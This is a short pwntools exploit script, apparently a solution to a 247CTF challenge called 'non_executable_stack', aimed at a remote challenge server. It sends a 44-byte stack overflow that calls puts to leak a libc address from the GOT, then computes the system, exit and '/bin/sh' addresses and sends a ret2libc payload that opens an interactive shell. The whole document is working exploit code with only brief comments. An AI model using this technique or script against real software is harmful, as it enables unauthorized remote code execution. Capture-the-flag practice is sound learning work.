#OFFSET @ 44
from pwn import *

elf = ELF("./non_executable_stack")
proc = remote("24c9775a93a76246.247ctf.com", 50406)

#Generating payload 1 for leaking `puts` offset
payload = b"A" * 44
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["main"])
payload += p32(elf.got["puts"])

proc.recvline()
proc.sendline(payload)
proc.recvline()

#parsing leaked puts offset
leak = u32(proc.recvline().strip()[0:4])
log.info(f"Leak @ {hex(leak)}")
libc_base = leak - 0x67360
log.info(f"Libc base @ {hex(libc_base)}")
system = libc_base + 0x3cd10
exit = libc_base + 0x2ff70
bin_sh = libc_base + 0x17b8cf

#generating payload 2 for getting a shell
payload2 = b"A" * 44
payload2 += p32(system)
payload2 += p32(exit)
payload2 += p32(bin_sh)

#Cross your fingers ;)
proc.sendline(payload2)
proc.interactive()
